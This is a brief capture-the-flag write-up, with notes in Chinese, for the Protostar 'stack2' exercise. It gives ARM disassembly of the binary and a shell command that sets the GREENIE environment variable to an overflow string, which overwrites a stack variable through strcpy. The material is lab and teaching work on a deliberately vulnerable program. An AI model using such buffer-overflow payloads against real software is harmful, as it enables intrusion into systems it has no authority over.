#stack2
@(protostar)

```armasm
.text:000104E4 main                                    ; DATA XREF: _start+20o
.text:000104E4                                         ; .text:off_103F0o
.text:000104E4
.text:000104E4 var_54          = -0x54
.text:000104E4 var_50          = -0x50
.text:000104E4 dest            = -0x4C
.text:000104E4 var_C           = -0xC
.text:000104E4 src             = -8
.text:000104E4
.text:000104E4                 STMFD   SP!, {R11,LR}
.text:000104E8                 ADD     R11, SP, #4
.text:000104EC                 SUB     SP, SP, #0x50
.text:000104F0                 STR     R0, [R11,#var_50]
.text:000104F4                 STR     R1, [R11,#var_54]
.text:000104F8                 LDR     R0, =aGreenie   ; "GREENIE"
.text:000104FC                 BL      getenv
.text:00010500                 STR     R0, [R11,#src]
.text:00010504                 LDR     R3, [R11,#src]
.text:00010508                 CMP     R3, #0
.text:0001050C                 BNE     loc_1051C
.text:00010510                 MOV     R0, #1          ; status
.text:00010514                 LDR     R1, =aPleaseSetTheGr ; "please set the GREENIE environment vari"...
.text:00010518                 BL      errx
.text:0001051C ; ---------------------------------------------------------------------------
.text:0001051C
.text:0001051C loc_1051C                               ; CODE XREF: main+28j
.text:0001051C                 MOV     R3, #0
.text:00010520                 STR     R3, [R11,#var_C]
.text:00010524                 SUB     R3, R11, #-dest
.text:00010528                 MOV     R0, R3          ; dest
.text:0001052C                 LDR     R1, [R11,#src]  ; src
.text:00010530                 BL      strcpy
.text:00010534                 LDR     R3, [R11,#var_C]
.text:00010538                 LDR     R2, =0xD0A0D0A
.text:0001053C                 CMP     R3, R2
.text:00010540                 BNE     loc_10550
.text:00010544                 LDR     R0, =aYouHaveCorrect ; "you have correctly modified the variabl"...
.text:00010548                 BL      puts
.text:0001054C                 B       loc_10560
.text:00010550 ; ---------------------------------------------------------------------------
.text:00010550
.text:00010550 loc_10550                               ; CODE XREF: main+5Cj
.text:00010550                 LDR     R3, [R11,#var_C]
.text:00010554                 LDR     R0, =aTryAgainYouGot ; "Try again, you got 0x%08x\n"
.text:00010558                 MOV     R1, R3
.text:0001055C                 BL      printf
.text:00010560
.text:00010560 loc_10560                               ; CODE XREF: main+68j
.text:00010560                 MOV     R0, R3
.text:00010564                 SUB     SP, R11, #4
.text:00010568                 LDMFD   SP!, {R11,PC}
.text:00010568 ; End of function main
```
modified变量位于`[R11,#var_C]`，程序读入GREENIE变量，strcpy到buffer，即`R11, #-dest`

```bash
./stack2 
stack2: please set the GREENIE environment variable
~/p/s/stack2 (master) $ set -x GREENIE AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\r\n\r
~/p/s/stack2 (master) $ ./stack2 
you have correctly modified the variable
```
bash中设置环境变量用export
